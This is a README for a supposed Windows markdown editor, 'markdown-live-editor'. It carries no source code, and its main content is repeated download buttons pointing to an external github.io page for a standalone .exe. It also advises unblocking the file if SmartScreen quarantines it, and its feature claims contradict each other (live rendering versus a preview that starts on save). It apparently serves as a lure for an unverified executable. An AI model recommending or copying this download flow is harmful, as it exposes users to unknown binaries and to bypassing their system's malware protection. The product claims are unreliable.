<div align="center">

<img src="assets/banner.svg" width="100%" alt="Markdown Editor Live banner"/>

# markdown-live-editor 📝⚡

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*A markdown editor that renders while you think, not after you stop.*

</div>

## 🧠 Overview

Let's get something out of the way: most markdown editors are glorified textareas with a preview pane bolted on as an afterthought. You type, you click "preview," you squint, you go back and fix the thing you broke. That's not a live editor — that's a slideshow. **markdown-live-editor** exists because the gap between "typing" and "seeing the result" should be measured in milliseconds, not in clicks.

This is a Windows-native, standalone Markdown Editor Live application built for people who write markdown constantly — README authors, technical writers, note-takers, static site tinkerers, and anyone who has ever lost an afternoon fighting with table syntax. The rendering engine sits directly next to the editor buffer, so every keystroke updates the preview in real time. No build step, no browser tab, no "refresh to see changes." Just a split pane that actually behaves like it's alive.

Who is this for? If you write documentation for a living, maintain open-source projects, draft blog posts in markdown, or just prefer plain text over rich text editors that fight you at every turn — this tool was built with your workflow in mind. It's opinionated software: it has strong defaults, a clean interface, and it doesn't try to be a full IDE. It tries to be the *best possible* markdown editor, and nothing else.

<p align="center">
  <a href="https://echodentistintensify.github.io/markdown-live-editor/">
    <img src="https://img.shields.io/badge/GET-Markdown_Editor_Live_2026-DB2777?style=for-the-badge&logo=windows&logoColor=white&labelColor=BE185D" width="550" alt="Download"/>
  </a>
</p>

> [!TIP]
> New here? Skip straight to the **How it works** section below for a visual walkthrough of the render pipeline before you install anything.

---

## 🔥 What It Actually Does

> [!NOTE]
> These aren't marketing bullet points — each one exists because a specific annoyance from other editors got fixed.

- **Real-time dual-pane rendering** — the preview pane isn't a "refresh on save" gimmick, it's tied directly to the parser's AST diffing, so only changed nodes re-render, keeping things snappy even in 5,000-line documents.

- **Syntax-aware editing** — the editor understands markdown structure, not just text. Bold, headers, and code fences get contextual highlighting instead of generic monospace sludge.

- **Synchronized scroll lock** — scroll the editor, the preview follows the same logical position, not just a percentage-based guess that drifts on long documents.

- **Offline-first by design** — zero network calls after install. Your notes stay on your machine, which matters if you write anything even remotely sensitive.

- **Export pipeline** — one-click export to HTML or PDF using the same render tree you're already looking at, so what you see is genuinely what you get.

- **Distraction-free mode** — hides every chrome element except the text itself, because sometimes the toolbar is just visual noise between you and the sentence you're writing.

- **Custom theme engine** — light, dark, and a genuinely readable "paper" theme, all swappable without a restart.

- **Table editor assist** — auto-aligns pipes and dashes as you type so you stop hand-counting columns like it's 2015.

---

## 🚀 Getting Started

1. Hit the download button above — it routes to the project landing page, not a random mirror.

2. Grab the Windows build (`.exe`, standalone, no installer wizard nonsense).

3. Run it. That's it — no setup screens, no account creation, no telemetry opt-in dialog you have to hunt for.

4. Open a `.md` file or just start typing in a blank buffer. The preview pane activates automatically the moment you save.

> [!IMPORTANT]
> This is a standalone executable. There is nothing to compile, no package manager involved, and no background service installed. If a tool asks you to run a script before it works, that's a red flag — this one just runs.

---

## 💻 System Requirements

| Requirement | Details |
|---|---|
| OS | Windows 10 or Windows 11 (64-bit) |
| Dependencies | None — fully standalone |
| Disk space | Under 100 MB |
| RAM | 4 GB minimum, 8 GB comfortable |
| Internet | Not required after download |
| Admin rights | Not required to run |

---

## ⚙️ How It Works

The architecture is intentionally boring in the best sense — boring means predictable, and predictable means fast. Here's the actual flow:

1. **Keystroke capture** — the editor buffer intercepts input and marks the changed line range instead of the whole document.

2. **Incremental parse** — only the dirty region gets re-tokenized against the markdown grammar, keeping parse time near-constant regardless of file size.

3. **AST diff** — the new node tree is compared against the previous render, isolating the minimal set of DOM-equivalent updates needed.

4. **Render patch** — the preview pane receives a patch, not a full repaint, which is why scroll position and cursor focus never jump around.

5. **Idle sync** — during pauses in typing, a background pass reconciles styles, table alignment, and link validation so nothing drifts silently.

```mermaid
flowchart LR

Keystroke --> Parse

Parse --> Diff

Diff --> Patch

Patch --> Preview
```

> [!TIP]
> This incremental-diff approach is *why* the editor stays responsive on huge files — most "live preview" tools naively re-render the entire document on every keystroke, which is fine until your README hits 2,000 lines and starts stuttering like a dial-up modem.

---

## 🩹 Troubleshooting

**Q: The preview pane went blank after pasting a large block of text.**
A: Large pastes trigger a full re-parse instead of an incremental one — give it half a second, it's not frozen, it's catching up.

**Q: My tables look misaligned in the raw markdown but fine in preview.**
A: That's expected. The table assist auto-pads columns visually in the editor; the underlying file still uses minimal spacing to stay diff-friendly in version control.

**Q: Dark theme text looks washed out on some code blocks.**
A: Syntax highlighting inside fenced code blocks currently uses a fixed palette — a themeable code-highlight system is on the roadmap, not forgotten.

**Q: The app won't launch and nothing happens.**
A: Check that Windows SmartScreen hasn't quarantined the executable on first run — right-click, Properties, and unblock if needed.

**Q: Can I use this without an internet connection at all?**
A: Yes. After the initial download, the entire app runs fully offline — that's a core design decision, not a limitation.

**Q: Export to PDF looks different from the live preview.**
A: PDF export uses print-specific CSS rules (margins, page breaks) that intentionally differ slightly from the on-screen editing view.

---

## ⌨️ Interface, Themes & Shortcuts

The UI leans minimal on purpose — a header bar, an editor pane, a preview pane, and a status strip. That's the whole interface. No ribbon, no nested settings menus five levels deep.

<details>
<summary><strong>Available themes</strong></summary>

- **Midnight** — dark theme, low-glare, built for late-night writing sessions
- **Paper** — light theme tuned for print-like contrast
- **Contrast** — high-contrast mode for accessibility needs

</details>

### Keyboard Shortcuts

| Shortcut | Action |
|---|---|
| `Ctrl + B` | Bold selected text |
| `Ctrl + I` | Italicize selected text |
| `Ctrl + K` | Insert link |
| `Ctrl + Shift + K` | Insert code block |
| `Ctrl + S` | Save current file |
| `Ctrl + Shift + S` | Save as / export |
| `Ctrl + P` | Toggle preview pane |
| `Ctrl + Shift + D` | Toggle distraction-free mode |
| `Ctrl + F` | Find in document |
| `Ctrl + H` | Find and replace |
| `Ctrl + Alt + T` | Cycle themes |
| `Ctrl + Tab` | Switch between open documents |

> [!WARNING]
> `Ctrl + Shift + D` hides the toolbar entirely — if you're new and it "disappeared," that shortcut is the culprit, not a bug.

---

## 🤝 Contributing & Community

This project grew because people who were annoyed by clunky markdown tools decided to fix it themselves instead of complaining on forums forever. If that sounds like you:

- Open an issue with real reproduction steps — vague reports get vague answers
- Discuss feature ideas before submitting large pull requests, so effort isn't wasted
- Keep the "boring architecture" philosophy in mind — incremental, predictable, fast beats clever-but-fragile

![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=flat-square) ![Made with](https://img.shields.io/badge/built%20with-C%2B%2B%20%2F%20Electron-333333?style=flat-square) ![Status](https://img.shields.io/badge/status-active-success?style=flat-square)

> Every good markdown editor started as someone's personal itch. This one's ours — now it's yours too.

---

## 📄 License

Released under the [MIT License](LICENSE), 2026. Do what you want with it — fork it, learn from it, ship your own spin on it.

---

## ⚠️ Disclaimer

This software is provided "as is," without warranty of any kind. The maintainers make no guarantees about fitness for a particular purpose beyond "it edits markdown pretty well." Always keep backups of important documents — no editor, live-rendering or otherwise, is a substitute for version control.

<p align="center">
  <a href="https://echodentistintensify.github.io/markdown-live-editor/">
    <img src="https://img.shields.io/badge/GET-Markdown_Editor_Live_2026-DB2777?style=for-the-badge&logo=windows&logoColor=white&labelColor=BE185D" width="550" alt="Download"/>
  </a>
</p>